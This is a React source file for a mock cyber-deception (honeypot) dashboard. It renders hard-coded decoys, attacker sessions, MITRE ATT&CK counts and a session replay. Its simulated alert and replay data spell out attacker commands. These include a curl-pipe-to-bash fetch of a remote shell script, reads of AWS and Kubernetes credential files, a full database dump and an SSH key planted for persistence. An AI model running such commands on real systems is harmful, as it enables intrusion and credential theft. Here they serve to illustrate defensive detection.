import { useState, useEffect, useRef } from "react";

// ── Simulated data ──────────────────────────────────────
const DECOYS = [
  { name: "bastion-dmz-01", tier: 3, type: "ssh", zone: "dmz", status: "active", ip: "10.100.0.50", sessions: 12, alerts: 3, uptime: "127d 14h" },
  { name: "web-prod-decoy", tier: 2, type: "http", zone: "prod", status: "active", ip: "10.0.3.22", sessions: 45, alerts: 7, uptime: "43d 2h" },
  { name: "db-staging-01", tier: 3, type: "mysql", zone: "staging", status: "active", ip: "10.0.5.11", sessions: 3, alerts: 1, uptime: "89d 7h" },
  { name: "smb-internal-01", tier: 2, type: "smb", zone: "internal", status: "rotating", ip: "10.0.1.88", sessions: 8, alerts: 2, uptime: "14d 0h" },
  { name: "ftp-legacy-01", tier: 1, type: "ftp", zone: "dmz", status: "active", ip: "10.100.0.71", sessions: 92, alerts: 0, uptime: "201d 5h" },
  { name: "ssh-dev-jump", tier: 2, type: "ssh", zone: "dev", status: "active", ip: "10.0.8.15", sessions: 6, alerts: 1, uptime: "67d 11h" },
  { name: "rdp-workstation", tier: 3, type: "rdp", zone: "internal", status: "degraded", ip: "10.0.1.200", sessions: 2, alerts: 5, uptime: "31d 9h" },
  { name: "dns-resolver-01", tier: 1, type: "dns", zone: "dmz", status: "active", ip: "10.100.0.53", sessions: 210, alerts: 0, uptime: "180d 3h" },
];

const SESSIONS = [
  { id: "a3f2", decoy: "bastion-dmz-01", ip: "45.33.32.156", country: "US", user: "jmorales", started: "2m ago", commands: 14, severity: "critical", phase: "Lateral Movement", tool: "manual", live: true },
  { id: "b7c1", decoy: "web-prod-decoy", ip: "185.220.101.34", country: "DE", user: "—", started: "8m ago", commands: 31, severity: "high", phase: "Credential Access", tool: "nmap + hydra", live: true },
  { id: "c9e4", decoy: "bastion-dmz-01", ip: "89.248.167.131", country: "NL", user: "admin", started: "23m ago", commands: 7, severity: "medium", phase: "Discovery", tool: "linpeas", live: true },
  { id: "d1f8", decoy: "db-staging-01", ip: "23.129.64.201", country: "US", user: "root", started: "1h ago", commands: 42, severity: "critical", phase: "Collection", tool: "manual", live: false },
  { id: "e5a2", decoy: "smb-internal-01", ip: "104.244.76.13", country: "LU", user: "deploy", started: "2h ago", commands: 3, severity: "low", phase: "Recon", tool: "enum4linux", live: false },
  { id: "f8b3", decoy: "ssh-dev-jump", ip: "198.98.56.78", country: "US", user: "admin", started: "3h ago", commands: 19, severity: "high", phase: "Persistence", tool: "cobalt strike", live: false },
];

const ALERTS = [
  { time: "2m ago", decoy: "bastion-dmz-01", type: "lateral.attempt", detail: "ssh db-prod-01.corp.internal", severity: "critical" },
  { time: "4m ago", decoy: "bastion-dmz-01", type: "honeytoken.accessed", detail: "AWS credentials read from ~/.aws/credentials", severity: "critical" },
  { time: "8m ago", decoy: "web-prod-decoy", type: "command.exec", detail: "curl http://45.33.32.156/shell.sh | bash", severity: "critical" },
  { time: "12m ago", decoy: "bastion-dmz-01", type: "command.exec", detail: "cat /home/jmorales/.kube/config", severity: "high" },
  { time: "23m ago", decoy: "bastion-dmz-01", type: "auth.success", detail: "admin:admin123 from 89.248.167.131", severity: "high" },
  { time: "1h ago", decoy: "db-staging-01", type: "command.exec", detail: "mysqldump --all-databases > /tmp/dump.sql", severity: "critical" },
  { time: "2h ago", decoy: "smb-internal-01", type: "auth.success", detail: "NTLM hash captured for deploy@CORP", severity: "high" },
  { time: "3h ago", decoy: "ssh-dev-jump", type: "command.exec", detail: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys', severity: "high" },
];

const MITRE_DATA = [
  { id: "T1021.004", name: "SSH", count: 34, trend: "+12" },
  { id: "T1059.004", name: "Unix Shell", count: 28, trend: "+8" },
  { id: "T1082", name: "System Info Discovery", count: 45, trend: "+3" },
  { id: "T1552.001", name: "Credentials In Files", count: 19, trend: "+15" },
  { id: "T1046", name: "Network Service Discovery", count: 67, trend: "-2" },
  { id: "T1105", name: "Ingress Tool Transfer", count: 12, trend: "+7" },
  { id: "T1003", name: "OS Credential Dumping", count: 8, trend: "+4" },
  { id: "T1053.003", name: "Cron", count: 6, trend: "+2" },
];

const TERMINAL_LINES = [
  { t: "14:03:22", who: "45.33.32.156", cmd: "whoami" },
  { t: "14:03:22", who: "system", cmd: "jmorales" },
  { t: "14:03:25", who: "45.33.32.156", cmd: "cat /home/jmorales/.aws/credentials" },
  { t: "14:03:25", who: "system", cmd: "[aws_profile]\naws_access_key_id = AKIAIOSFODNN7CANARY2\naws_secret_access_key = wJalrXU...xPq" },
  { t: "14:03:31", who: "45.33.32.156", cmd: "kubectl get pods -n production --context prod-us-east" },
  { t: "14:03:33", who: "system", cmd: "NAME                          READY   STATUS    RESTARTS   AGE\napi-gateway-6b4f5c8d9-x7k2m  1/1     Running   0          12d\nworker-pool-7f8a9b3c1-p4n8    1/1     Running   0          12d" },
  { t: "14:03:41", who: "45.33.32.156", cmd: "ssh db-prod-01.corp.internal" },
  { t: "14:03:44", who: "system", cmd: "ssh: connect to host db-prod-01.corp.internal port 22: Connection timed out" },
  { t: "14:04:02", who: "45.33.32.156", cmd: "cat /opt/ansible/inventory/production" },
  { t: "14:04:02", who: "system", cmd: "[webservers]\nweb-prod-01.corp.internal ansible_user=deploy\nweb-prod-02.corp.internal ansible_user=deploy\n..." },
];

// ── Utility Components ──────────────────────────────────

const SeverityDot = ({ severity }) => {
  const colors = { critical: "#ff2d55", high: "#ff9500", medium: "#ffcc00", low: "#34c759", info: "#8e8e93" };
  return <span style={{ display: "inline-block", width: 8, height: 8, borderRadius: "50%", backgroundColor: colors[severity] || "#8e8e93", boxShadow: `0 0 6px ${colors[severity] || "#8e8e93"}80` }} />;
};

const TierBadge = ({ tier }) => {
  const labels = { 1: "BEACON", 2: "SCRIPTED", 3: "ADAPTIVE" };
  const colors = { 1: "#636366", 2: "#0a84ff", 3: "#bf5af2" };
  return (
    <span style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", padding: "2px 6px", borderRadius: 3, backgroundColor: colors[tier] + "22", color: colors[tier], border: `1px solid ${colors[tier]}44` }}>
      T{tier} {labels[tier]}
    </span>
  );
};

const StatusIndicator = ({ status }) => {
  const map = { active: { color: "#30d158", label: "ONLINE" }, rotating: { color: "#ffcc00", label: "ROTATING" }, degraded: { color: "#ff9500", label: "DEGRADED" }, offline: { color: "#ff3b30", label: "OFFLINE" } };
  const s = map[status] || map.active;
  return (
    <span style={{ display: "inline-flex", alignItems: "center", gap: 5, fontSize: 10, fontWeight: 600, letterSpacing: "0.06em", color: s.color }}>
      <span style={{ width: 6, height: 6, borderRadius: "50%", backgroundColor: s.color, animation: status === "active" ? "pulse 2s ease-in-out infinite" : "none" }} />
      {s.label}
    </span>
  );
};

const Stat = ({ label, value, accent, sub }) => (
  <div style={{ textAlign: "center" }}>
    <div style={{ fontSize: 28, fontWeight: 200, fontFamily: "'JetBrains Mono', monospace", color: accent || "#e5e5ea", lineHeight: 1 }}>{value}</div>
    <div style={{ fontSize: 10, fontWeight: 600, letterSpacing: "0.1em", color: "#8e8e93", marginTop: 4 }}>{label}</div>
    {sub && <div style={{ fontSize: 10, color: "#636366", marginTop: 2 }}>{sub}</div>}
  </div>
);

// ── Main Dashboard ──────────────────────────────────────

export default function CICDecoyDashboard() {
  const [activePage, setActivePage] = useState("overview");
  const [selectedSession, setSelectedSession] = useState(null);
  const [time, setTime] = useState(new Date());
  const termRef = useRef(null);

  useEffect(() => {
    const interval = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [selectedSession]);

  const navItems = [
    { id: "overview", label: "OVERVIEW", icon: "◈" },
    { id: "sessions", label: "SESSIONS", icon: "◉" },
    { id: "intel", label: "INTELLIGENCE", icon: "◆" },
    { id: "decoys", label: "DECOY FLEET", icon: "⬡" },
  ];

  const liveSessions = SESSIONS.filter(s => s.live).length;
  const critAlerts = ALERTS.filter(a => a.severity === "critical").length;

  return (
    <div style={{ fontFamily: "'JetBrains Mono', 'SF Mono', 'Fira Code', monospace", backgroundColor: "#0a0a0c", color: "#e5e5ea", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@200;300;400;500;600;700&display=swap');
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #2c2c2e; border-radius: 2px; }
      `}</style>

      {/* ── Header ── */}
      <header style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 20px", borderBottom: "1px solid #1c1c1e", background: "linear-gradient(180deg, #111113 0%, #0a0a0c 100%)", position: "relative", overflow: "hidden" }}>
        <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 1, background: "linear-gradient(90deg, transparent, #bf5af233, #0a84ff33, transparent)" }} />
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ fontSize: 18, fontWeight: 700, letterSpacing: "-0.02em" }}>
            <span style={{ color: "#bf5af2" }}>CI</span>
            <span style={{ color: "#636366" }}>/</span>
            <span style={{ color: "#0a84ff" }}>CDecoy</span>
          </div>
          <span style={{ fontSize: 9, color: "#48484a", fontWeight: 500, letterSpacing: "0.1em", padding: "2px 8px", border: "1px solid #2c2c2e", borderRadius: 3 }}>v0.1.0-alpha</span>
        </div>
        <nav style={{ display: "flex", gap: 2 }}>
          {navItems.map(item => (
            <button
              key={item.id}
              onClick={() => setActivePage(item.id)}
              style={{
                background: activePage === item.id ? "#1c1c1e" : "transparent",
                border: activePage === item.id ? "1px solid #2c2c2e" : "1px solid transparent",
                color: activePage === item.id ? "#e5e5ea" : "#636366",
                padding: "6px 14px",
                borderRadius: 4,
                fontSize: 10,
                fontWeight: 600,
                letterSpacing: "0.08em",
                cursor: "pointer",
                fontFamily: "inherit",
                transition: "all 0.15s ease",
              }}
            >
              <span style={{ marginRight: 6 }}>{item.icon}</span>{item.label}
            </button>
          ))}
        </nav>
        <div style={{ fontSize: 11, color: "#48484a", fontWeight: 400 }}>
          {time.toLocaleTimeString("en-US", { hour12: false })} UTC
        </div>
      </header>

      {/* ── Content ── */}
      <main style={{ flex: 1, padding: 16, overflow: "auto" }}>
        {activePage === "overview" && (
          <div style={{ animation: "fadeIn 0.3s ease" }}>
            {/* Stats bar */}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 12, marginBottom: 16 }}>
              {[
                { l: "DECOYS ACTIVE", v: DECOYS.filter(d=>d.status==="active").length + "/" + DECOYS.length, a: "#30d158" },
                { l: "LIVE SESSIONS", v: liveSessions, a: liveSessions > 0 ? "#ff9500" : "#8e8e93" },
                { l: "CRITICAL ALERTS", v: critAlerts, a: critAlerts > 0 ? "#ff2d55" : "#8e8e93" },
                { l: "EVENTS / 24H", v: "1,247", a: "#0a84ff" },
                { l: "UNIQUE IPs / 24H", v: "38", a: "#bf5af2" },
                { l: "IOCs GENERATED", v: "124", a: "#64d2ff" },
              ].map((s, i) => (
                <div key={i} style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: "14px 12px" }}>
                  <Stat label={s.l} value={s.v} accent={s.a} />
                </div>
              ))}
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
              {/* Alert feed */}
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  ALERT FEED
                  <span style={{ color: "#ff2d55", animation: "pulse 1.5s ease-in-out infinite" }}>● LIVE</span>
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 280, overflow: "auto" }}>
                  {ALERTS.map((a, i) => (
                    <div key={i} style={{ display: "grid", gridTemplateColumns: "70px 24px 1fr auto", gap: 8, alignItems: "center", fontSize: 11, padding: "6px 8px", borderRadius: 4, backgroundColor: a.severity === "critical" ? "#ff2d5508" : "transparent", borderLeft: `2px solid ${a.severity === "critical" ? "#ff2d55" : a.severity === "high" ? "#ff9500" : "#636366"}` }}>
                      <span style={{ color: "#48484a", fontSize: 10 }}>{a.time}</span>
                      <SeverityDot severity={a.severity} />
                      <div>
                        <span style={{ color: "#8e8e93" }}>{a.decoy}</span>
                        <span style={{ color: "#48484a" }}> → </span>
                        <span style={{ color: "#e5e5ea" }}>{a.type}</span>
                      </div>
                      <span style={{ color: "#636366", fontSize: 10, maxWidth: 200, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{a.detail}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* MITRE heatmap */}
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12 }}>
                  MITRE ATT&CK — 7 DAY TREND
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {MITRE_DATA.map((t, i) => {
                    const maxCount = Math.max(...MITRE_DATA.map(d => d.count));
                    const pct = (t.count / maxCount) * 100;
                    const isUp = t.trend.startsWith("+");
                    return (
                      <div key={i} style={{ display: "grid", gridTemplateColumns: "80px 1fr 40px 40px", gap: 8, alignItems: "center", fontSize: 11 }}>
                        <span style={{ color: "#0a84ff", fontSize: 10 }}>{t.id}</span>
                        <div style={{ position: "relative", height: 16, backgroundColor: "#1c1c1e", borderRadius: 2 }}>
                          <div style={{ position: "absolute", top: 0, left: 0, height: "100%", width: `${pct}%`, background: `linear-gradient(90deg, #bf5af244, #0a84ff44)`, borderRadius: 2, transition: "width 0.6s ease" }} />
                          <span style={{ position: "absolute", left: 6, top: 1, fontSize: 9, color: "#8e8e93", zIndex: 1 }}>{t.name}</span>
                        </div>
                        <span style={{ textAlign: "right", color: "#e5e5ea", fontSize: 11 }}>{t.count}</span>
                        <span style={{ textAlign: "right", color: isUp ? "#ff9500" : "#30d158", fontSize: 10 }}>{t.trend}</span>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>

            {/* Decoy fleet grid */}
            <div style={{ marginTop: 12, background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
              <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12 }}>DECOY FLEET STATUS</div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 8 }}>
                {DECOYS.map((d, i) => (
                  <div key={i} style={{ padding: "10px 12px", border: "1px solid #1c1c1e", borderRadius: 4, backgroundColor: d.alerts > 2 ? "#ff2d5506" : "#0a0a0c", cursor: "pointer", transition: "border-color 0.15s", position: "relative" }}
                    onMouseOver={e => e.currentTarget.style.borderColor = "#2c2c2e"}
                    onMouseOut={e => e.currentTarget.style.borderColor = "#1c1c1e"}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 6 }}>
                      <div>
                        <div style={{ fontSize: 12, fontWeight: 500, color: "#e5e5ea" }}>{d.name}</div>
                        <div style={{ fontSize: 10, color: "#48484a", marginTop: 2 }}>{d.ip} · {d.zone}</div>
                      </div>
                      <StatusIndicator status={d.status} />
                    </div>
                    <div style={{ display: "flex", gap: 8, alignItems: "center", marginTop: 6 }}>
                      <TierBadge tier={d.tier} />
                      <span style={{ fontSize: 10, color: "#636366" }}>{d.type.toUpperCase()}</span>
                      <span style={{ fontSize: 10, color: "#48484a", marginLeft: "auto" }}>{d.sessions} sessions</span>
                      {d.alerts > 0 && <span style={{ fontSize: 10, color: "#ff9500", fontWeight: 600 }}>{d.alerts} alerts</span>}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activePage === "sessions" && (
          <div style={{ animation: "fadeIn 0.3s ease", display: "grid", gridTemplateColumns: selectedSession ? "1fr 1fr" : "1fr", gap: 12 }}>
            {/* Session list */}
            <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
              <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12, display: "flex", justifyContent: "space-between" }}>
                ACTIVE & RECENT SESSIONS
                <span style={{ color: "#636366" }}>{SESSIONS.length} total</span>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                {SESSIONS.map((s, i) => (
                  <div key={i} onClick={() => setSelectedSession(s)}
                    style={{
                      display: "grid", gridTemplateColumns: "24px 130px 110px 70px 1fr 80px 60px",
                      gap: 8, alignItems: "center", fontSize: 11, padding: "8px 10px", borderRadius: 4,
                      cursor: "pointer", transition: "background 0.1s",
                      backgroundColor: selectedSession?.id === s.id ? "#1c1c1e" : "transparent",
                      borderLeft: `2px solid ${s.severity === "critical" ? "#ff2d55" : s.severity === "high" ? "#ff9500" : s.severity === "medium" ? "#ffcc00" : "#636366"}`,
                    }}
                    onMouseOver={e => { if (selectedSession?.id !== s.id) e.currentTarget.style.backgroundColor = "#111116"; }}
                    onMouseOut={e => { if (selectedSession?.id !== s.id) e.currentTarget.style.backgroundColor = "transparent"; }}>
                    {s.live ? <span style={{ color: "#30d158", animation: "pulse 1.5s ease-in-out infinite", fontSize: 8 }}>●</span> : <span style={{ color: "#48484a", fontSize: 8 }}>○</span>}
                    <span style={{ color: "#e5e5ea" }}>{s.decoy}</span>
                    <span style={{ color: "#8e8e93" }}>{s.ip}</span>
                    <span style={{ color: "#636366" }}>{s.country}</span>
                    <span style={{ color: "#bf5af2", fontSize: 10 }}>{s.phase}</span>
                    <span style={{ color: "#48484a", fontSize: 10 }}>{s.started}</span>
                    <span style={{ color: "#636366", fontSize: 10 }}>{s.commands} cmds</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Session detail / replay */}
            {selectedSession && (
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, display: "flex", flexDirection: "column" }}>
                <div style={{ padding: "12px 14px", borderBottom: "1px solid #1c1c1e" }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <div>
                      <span style={{ fontSize: 12, fontWeight: 600 }}>{selectedSession.decoy}</span>
                      <span style={{ fontSize: 11, color: "#48484a" }}> · session {selectedSession.id}</span>
                    </div>
                    <button onClick={() => setSelectedSession(null)} style={{ background: "none", border: "1px solid #2c2c2e", color: "#636366", padding: "3px 10px", borderRadius: 3, fontSize: 10, cursor: "pointer", fontFamily: "inherit" }}>✕</button>
                  </div>
                  <div style={{ display: "flex", gap: 16, marginTop: 8, fontSize: 10, color: "#8e8e93" }}>
                    <span>IP: <span style={{ color: "#e5e5ea" }}>{selectedSession.ip}</span></span>
                    <span>User: <span style={{ color: "#e5e5ea" }}>{selectedSession.user}</span></span>
                    <span>Tool: <span style={{ color: "#ff9500" }}>{selectedSession.tool}</span></span>
                    <span>Phase: <span style={{ color: "#bf5af2" }}>{selectedSession.phase}</span></span>
                  </div>
                </div>
                <div ref={termRef} style={{ flex: 1, padding: 12, fontFamily: "'JetBrains Mono', monospace", fontSize: 11, lineHeight: 1.7, overflow: "auto", maxHeight: 400, backgroundColor: "#08080a" }}>
                  <div style={{ color: "#48484a", marginBottom: 8 }}>──── Session Replay ────</div>
                  {TERMINAL_LINES.map((line, i) => (
                    <div key={i}>
                      <span style={{ color: "#2c2c2e" }}>[{line.t}] </span>
                      {line.who === "system" ? (
                        <span style={{ color: "#636366", whiteSpace: "pre-wrap" }}>{line.cmd}</span>
                      ) : (
                        <span><span style={{ color: "#ff2d55" }}>{line.who}</span> <span style={{ color: "#48484a" }}>$</span> <span style={{ color: "#30d158" }}>{line.cmd}</span></span>
                      )}
                    </div>
                  ))}
                  {selectedSession.live && <span style={{ color: "#30d158", animation: "pulse 1s ease-in-out infinite" }}>▌</span>}
                </div>
              </div>
            )}
          </div>
        )}

        {activePage === "intel" && (
          <div style={{ animation: "fadeIn 0.3s ease" }}>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 12, marginBottom: 12 }}>
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <Stat label="STIX BUNDLES / 24H" value="47" accent="#0a84ff" />
              </div>
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <Stat label="ACTIVE IOCs" value="124" accent="#ff9500" />
              </div>
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <Stat label="THREAT FEED MATCHES" value="8" accent="#ff2d55" />
              </div>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
              {/* Top threat actors */}
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12 }}>TOP THREAT ACTORS — 24H</div>
                {[
                  { ip: "45.33.32.156", country: "US", sessions: 4, severity: "critical", techniques: 8, tools: ["manual"] },
                  { ip: "185.220.101.34", country: "DE", sessions: 3, severity: "high", techniques: 5, tools: ["nmap", "hydra"] },
                  { ip: "198.98.56.78", country: "US", sessions: 2, severity: "high", techniques: 6, tools: ["cobalt strike"] },
                  { ip: "89.248.167.131", country: "NL", sessions: 2, severity: "medium", techniques: 3, tools: ["linpeas"] },
                  { ip: "104.244.76.13", country: "LU", sessions: 1, severity: "low", techniques: 2, tools: ["enum4linux"] },
                ].map((actor, i) => (
                  <div key={i} style={{ display: "grid", gridTemplateColumns: "24px 120px 40px 80px 1fr", gap: 8, alignItems: "center", fontSize: 11, padding: "6px 0", borderBottom: "1px solid #1c1c1e" }}>
                    <SeverityDot severity={actor.severity} />
                    <span style={{ color: "#e5e5ea" }}>{actor.ip}</span>
                    <span style={{ color: "#636366" }}>{actor.country}</span>
                    <span style={{ color: "#8e8e93", fontSize: 10 }}>{actor.sessions} sess / {actor.techniques} TTPs</span>
                    <span style={{ color: "#ff9500", fontSize: 10 }}>{actor.tools.join(", ")}</span>
                  </div>
                ))}
              </div>

              {/* Kill chains detected */}
              <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
                <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12 }}>KILL CHAINS DETECTED</div>
                {[
                  { actor: "45.33.32.156", phases: ["Recon", "Discovery", "Credential Access", "Lateral Movement"], decoy: "bastion-dmz-01", confidence: "HIGH" },
                  { actor: "198.98.56.78", phases: ["Recon", "Execution", "Persistence"], decoy: "ssh-dev-jump", confidence: "HIGH" },
                  { actor: "185.220.101.34", phases: ["Discovery", "Credential Access", "Collection"], decoy: "web-prod-decoy", confidence: "MEDIUM" },
                ].map((kc, i) => (
                  <div key={i} style={{ padding: "10px 0", borderBottom: "1px solid #1c1c1e" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                      <span style={{ fontSize: 11, color: "#e5e5ea" }}>{kc.actor}</span>
                      <span style={{ fontSize: 9, color: kc.confidence === "HIGH" ? "#ff2d55" : "#ffcc00", fontWeight: 700, letterSpacing: "0.08em" }}>{kc.confidence}</span>
                    </div>
                    <div style={{ display: "flex", gap: 4, alignItems: "center", flexWrap: "wrap" }}>
                      {kc.phases.map((phase, j) => (
                        <span key={j} style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
                          <span style={{ fontSize: 10, padding: "2px 6px", backgroundColor: "#1c1c1e", borderRadius: 3, color: "#bf5af2" }}>{phase}</span>
                          {j < kc.phases.length - 1 && <span style={{ color: "#2c2c2e", fontSize: 10 }}>→</span>}
                        </span>
                      ))}
                    </div>
                    <div style={{ fontSize: 10, color: "#48484a", marginTop: 4 }}>on {kc.decoy}</div>
                  </div>
                ))}
              </div>
            </div>

            {/* Honeytoken triggers */}
            <div style={{ marginTop: 12, background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
              <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93", marginBottom: 12 }}>
                <span style={{ color: "#ff2d55" }}>⚠</span> HONEYTOKEN TRIGGERS
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                {[
                  { time: "4m ago", token: "aws-prod-admin-canary", type: "AWS Credential", action: "File read via cat", actor: "45.33.32.156", decoy: "bastion-dmz-01" },
                  { time: "12m ago", token: "kubeconfig-prod-canary", type: "Kubeconfig", action: "File read via cat", actor: "45.33.32.156", decoy: "bastion-dmz-01" },
                  { time: "2h ago", token: "ntlm-hash-canary", type: "NTLM Hash", action: "SMB auth capture", actor: "104.244.76.13", decoy: "smb-internal-01" },
                ].map((ht, i) => (
                  <div key={i} style={{ display: "grid", gridTemplateColumns: "70px 160px 120px 1fr 120px", gap: 8, alignItems: "center", fontSize: 11, padding: "6px 8px", borderRadius: 4, backgroundColor: "#ff2d5506", borderLeft: "2px solid #ff2d55" }}>
                    <span style={{ color: "#48484a", fontSize: 10 }}>{ht.time}</span>
                    <span style={{ color: "#ff9500" }}>{ht.token}</span>
                    <span style={{ color: "#8e8e93" }}>{ht.type}</span>
                    <span style={{ color: "#e5e5ea" }}>{ht.action}</span>
                    <span style={{ color: "#636366", fontSize: 10 }}>{ht.actor}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activePage === "decoys" && (
          <div style={{ animation: "fadeIn 0.3s ease" }}>
            <div style={{ background: "#111113", border: "1px solid #1c1c1e", borderRadius: 6, padding: 14 }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 14 }}>
                <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.1em", color: "#8e8e93" }}>DECOY FLEET MANAGEMENT</div>
                <div style={{ display: "flex", gap: 6 }}>
                  {["All", "T1", "T2", "T3"].map(f => (
                    <button key={f} style={{ background: "#1c1c1e", border: "1px solid #2c2c2e", color: "#8e8e93", padding: "3px 10px", borderRadius: 3, fontSize: 10, cursor: "pointer", fontFamily: "inherit" }}>{f}</button>
                  ))}
                </div>
              </div>

              {/* Table header */}
              <div style={{ display: "grid", gridTemplateColumns: "180px 70px 60px 70px 80px 80px 80px 80px 1fr", gap: 8, padding: "6px 10px", fontSize: 9, fontWeight: 700, letterSpacing: "0.1em", color: "#48484a", borderBottom: "1px solid #1c1c1e" }}>
                <span>NAME</span><span>TIER</span><span>TYPE</span><span>ZONE</span><span>STATUS</span><span>IP</span><span>SESSIONS</span><span>ALERTS</span><span>UPTIME</span>
              </div>

              {DECOYS.map((d, i) => (
                <div key={i} style={{ display: "grid", gridTemplateColumns: "180px 70px 60px 70px 80px 80px 80px 80px 1fr", gap: 8, alignItems: "center", padding: "8px 10px", fontSize: 11, borderBottom: "1px solid #0d0d0f", transition: "background 0.1s", cursor: "pointer" }}
                  onMouseOver={e => e.currentTarget.style.backgroundColor = "#111116"}
                  onMouseOut={e => e.currentTarget.style.backgroundColor = "transparent"}>
                  <span style={{ color: "#e5e5ea", fontWeight: 500 }}>{d.name}</span>
                  <TierBadge tier={d.tier} />
                  <span style={{ color: "#636366" }}>{d.type}</span>
                  <span style={{ color: "#48484a" }}>{d.zone}</span>
                  <StatusIndicator status={d.status} />
                  <span style={{ color: "#8e8e93" }}>{d.ip}</span>
                  <span style={{ color: "#e5e5ea" }}>{d.sessions}</span>
                  <span style={{ color: d.alerts > 2 ? "#ff2d55" : d.alerts > 0 ? "#ff9500" : "#48484a", fontWeight: d.alerts > 0 ? 600 : 400 }}>{d.alerts}</span>
                  <span style={{ color: "#48484a" }}>{d.uptime}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      {/* ── Footer ── */}
      <footer style={{ padding: "8px 20px", borderTop: "1px solid #1c1c1e", display: "flex", justifyContent: "space-between", fontSize: 9, color: "#2c2c2e", letterSpacing: "0.06em" }}>
        <span>k3s cluster: <span style={{ color: "#30d158" }}>●</span> connected · NATS: <span style={{ color: "#30d158" }}>●</span> streaming · inference: <span style={{ color: "#30d158" }}>●</span> healthy</span>
        <span>CI/CDecoy — Cyber Deception Platform</span>
      </footer>
    </div>
  );
}
